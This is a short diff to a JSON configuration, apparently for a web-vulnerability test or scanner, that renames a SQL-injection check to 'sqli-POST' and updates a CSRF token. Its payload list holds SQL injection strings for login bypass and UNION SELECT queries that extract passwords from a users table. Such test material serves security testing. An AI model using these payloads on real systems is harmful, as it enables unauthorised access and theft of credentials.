@@ -1,5 +1,5 @@
 {
-    "id": "sqli",
+    "id": "sqli-POST",
     "request": {
         "path": "/",
         "method": "POST",
@@ -28,7 +28,7 @@
         }
     ],
     "payloads": [
-        "csrf=S6rcZ4qlc8uOnE3xf3Ra5RDP8mR04o4D&username=administrator'--&password=test",
+        "csrf=ygGzyeeZKqWwHH2efBkDMPNrwVpEksVG&username=administrator'--&password=test",
         "username=admin&password=%27+OR+1=1--",
         "username=admin&password=1 UNION SELECT * FROM users WHERE id = 1--",
         "username=admin&password=1 UNION SELECT password FROM users WHERE username = 'admin'--",
